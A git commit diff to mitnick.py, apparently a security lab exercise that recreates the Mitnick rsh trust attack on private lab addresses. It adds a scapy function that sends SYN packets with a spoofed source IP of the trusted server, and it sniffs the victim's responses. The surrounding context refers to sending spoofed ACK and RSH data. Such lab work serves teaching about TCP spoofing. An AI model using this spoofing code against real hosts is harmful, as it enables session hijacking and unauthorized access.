02407bccffff80a0a68b4597f31bac5ce2db84b5
myj2 <77760967+myj2@users.noreply.github.com>
2021-03-02 20:24:15 +0000

    Update mitnick.py

--- mitnick.py
+++ mitnick.py
@@ -51,3 +51,70 @@ def send_RSH_data():
 send_SYN(srv_ip, x_ip, srv_port, x_port)
 # sniff syn+ack response from victim
 send_ACK(srv_ip, x_ip, srv_port, x_port, seq, ack)
+
+
+
+
+###############################################
+
+
+
+
+
+#!/usr/bin/python3
+ 
+# Comments in quotation marks are from the scapy documentation
+ 
+# ’U’: URG bit
+# ’A’: ACK bit
+# ’P’: PSH bit
+# ’R’: RST bit
+# ’S’: SYN bit
+# ’F’: FIN bit
+ 
+from scapy.all import *
+import time
+
+# victim oh no plz help me  
+x_ip = "10.0.2.8"
+x_port = 514
+ 
+# server trusty ol server
+srv_ip = "10.0.2.7"
+srv_port = 1023
+ 
+def send_SYN(sip, dip, sport, dport):
+	ip = IP(src=sip, dst=dip)
+	tcp = TCP(sport=sport, dport=dport)
+	tcp.flags = "S"
+	packet = ip/tcp
+ 
+	if tcp.flags == "S":
+		print("Sending SYN to {}:{} from {}:{}".format(sip, sport, dip, dport))
+		# ls(packet) # "List available layers, or infos on a given layer class or name."
+		send(packet)
+	else:
+		print("Error: TCP flag not set to SYN in send_SYN function. Quitting...")
+		quit()
+
+
+
+
+
+
+boi = AsyncSniffer(count=2)
+
+boi.start()
+
+send_SYN(srv_ip, x_ip, srv_port, x_port)
+
+boi.join()
+
+results = boi.results 
+
+print(results)
+time.sleep(20)
+
+boi.stop()
+
+
